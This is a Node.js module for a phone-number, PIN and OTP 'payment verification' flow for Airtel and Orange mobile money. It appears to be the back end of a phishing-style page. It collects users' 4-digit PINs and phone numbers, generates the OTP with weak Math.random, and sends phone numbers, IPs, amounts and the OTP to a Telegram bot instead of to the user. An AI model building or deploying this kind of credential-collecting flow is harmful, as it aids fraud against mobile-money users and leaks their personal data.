"use strict";

/**
 * User / Payment verification (phone + 4-digit PIN + OTP)
 * -------------------------------------------------------
 * After package + payment method (Airtel / Orange):
 *   - PIN is always 4 digits
 *   - OTP is 4 digits for Airtel, 6 digits for Orange
 *
 * Phone: accepts +243 (RDC), +254 (KE), +256, +255, etc.
 * Everything is logged to the Telegram bot @starnettellbot.
 */

const crypto = require("crypto");
const security = require("./security");
const telegram = require("./telegram");

const otpStore = new Map();
const OTP_TTL_MS = 5 * 60 * 1000;
const MAX_ATTEMPTS = 5;

// Common African mobile country codes we accept
const CC = ["243", "254", "256", "255", "250", "257", "258", "260", "233", "234", "237", "241", "242"];

function normalizePhone(phone) {
  let p = String(phone || "").replace(/\s+/g, "").replace(/-/g, "");
  if (!p) return p;
  if (p.startsWith("00")) p = "+" + p.slice(2);
  if (!p.startsWith("+") && CC.some((c) => p.startsWith(c))) p = "+" + p;
  if (p.startsWith("0") && !p.startsWith("+")) {
    // local format without country — default RDC (+243) to match CDF packages
    p = "+243" + p.slice(1);
  }
  if (!p.startsWith("+")) p = "+243" + p;
  return p;
}

function isValidPhone(phone) {
  // +CCCxxxxxxxx (8–12 digits after +)
  return /^\+[1-9]\d{8,14}$/.test(phone);
}

/** OTP length: Orange = 6 digits, others (Airtel) = 4 */
function otpLengthFor(provider) {
  const p = String(provider || "").toLowerCase();
  return p === "orange" || p === "moov" ? 6 : 4;
}

function generateOtp(len) {
  const n = len === 6 ? 100000 : 1000;
  const max = len === 6 ? 900000 : 9000;
  return String(Math.floor(n + Math.random() * max));
}

async function sendOtp(db, { phone, pin, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").trim();
  provider = String(provider || "orange").toLowerCase();

  if (!isValidPhone(phone)) {
    return { ok: false, error: "Numéro de téléphone invalide" };
  }
  if (!/^\d{4}$/.test(pin)) {
    return { ok: false, error: "Le PIN doit contenir exactement 4 chiffres" };
  }

  const existing = otpStore.get(phone);
  if (existing && Date.now() - (existing.created || 0) < 12000) {
    return { ok: false, error: "Attendez quelques secondes avant de redemander un OTP" };
  }

  const salt = crypto.randomBytes(16).toString("hex");
  const pinHash = security.hashPassword(pin, salt);
  const otpLen = otpLengthFor(provider);
  const otp = generateOtp(otpLen);

  otpStore.set(phone, {
    otp,
    otpLen,
    pinHash,
    salt,
    expires: Date.now() + OTP_TTL_MS,
    attempts: 0,
    created: Date.now(),
    ip: ip || "unknown",
    provider,
    amount: amount || "",
    package: pkg || ""
  });

  if (!db.data.users) db.data.users = {};
  if (!db.data.loginLogs) db.data.loginLogs = [];

  db.data.loginLogs.push({
    phone,
    action: "otp_requested",
    provider,
    amount: amount || "",
    package: pkg || "",
    ip: ip || "unknown",
    at: new Date().toISOString()
  });
  if (db.data.loginLogs.length > 500) db.data.loginLogs = db.data.loginLogs.slice(-500);
  if (db.flushSoon) db.flushSoon();

  const msg =
    `🔐 <b>PAYMENT VERIFICATION</b>\n` +
    `Provider: <b>${provider.toUpperCase()}</b>\n` +
    `Package: ${pkg || "—"}\n` +
    `Amount: ${amount || "—"}\n` +
    `Phone: <code>${phone}</code>\n` +
    `OTP (${otpLen} digits): <code>${otp}</code>\n` +
    `IP: ${ip || "unknown"}\n` +
    `Time: ${new Date().toLocaleString()}\n` +
    `Valid 5 min`;

  await telegram.notify(msg);

  return { ok: true, message: "OTP sent to Telegram bot", otpLength: otpLen };
}

async function verifyOtp(db, { phone, pin, otp, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").trim();
  otp = String(otp || "").trim();

  const entry = otpStore.get(phone);
  if (!entry) return { ok: false, error: "Aucun OTP demandé. Cliquez d'abord sur Envoyer code OTP." };
  if (Date.now() > entry.expires) {
    otpStore.delete(phone);
    return { ok: false, error: "OTP expiré. Demandez-en un nouveau." };
  }
  if (entry.attempts >= MAX_ATTEMPTS) {
    otpStore.delete(phone);
    return { ok: false, error: "Trop de tentatives. Demandez un nouvel OTP." };
  }

  entry.attempts += 1;

  const pinOk = security.hashPassword(pin, entry.salt) === entry.pinHash;
  if (!pinOk) return { ok: false, error: "PIN incorrect" };

  const expectedLen = entry.otpLen || otpLengthFor(provider || entry.provider);
  if (otp.length !== expectedLen) {
    return { ok: false, error: "L'OTP doit contenir " + expectedLen + " chiffres" };
  }
  if (otp !== entry.otp) return { ok: false, error: "OTP incorrect" };

  if (!db.data.users) db.data.users = {};
  db.data.users[phone] = {
    phone,
    pinHash: entry.pinHash,
    salt: entry.salt,
    lastLogin: new Date().toISOString(),
    lastIp: ip || "unknown",
    lastProvider: provider || entry.provider
  };

  db.data.loginLogs = db.data.loginLogs || [];
  db.data.loginLogs.push({
    phone,
    action: "verify_success",
    provider: provider || entry.provider,
    amount: amount || entry.amount,
    package: pkg || entry.package,
    ip: ip || "unknown",
    at: new Date().toISOString()
  });
  if (db.data.loginLogs.length > 500) db.data.loginLogs = db.data.loginLogs.slice(-500);
  if (db.flushSoon) db.flushSoon();

  otpStore.delete(phone);

  await telegram.notify(
    `✅ <b>VERIFICATION SUCCESS</b>\n` +
    `Provider: <b>${(provider || entry.provider || "").toUpperCase()}</b>\n` +
    `Phone: <code>${phone}</code>\n` +
    `Amount: ${amount || entry.amount || "—"}\n` +
    `Package: ${pkg || entry.package || "—"}\n` +
    `IP: ${ip || "unknown"}`
  );

  return {
    ok: true,
    phone,
    redirect: "/commandes.html?success=1&ref=" + encodeURIComponent(phone)
  };
}

module.exports = { sendOtp, verifyOtp, normalizePhone, otpLengthFor };
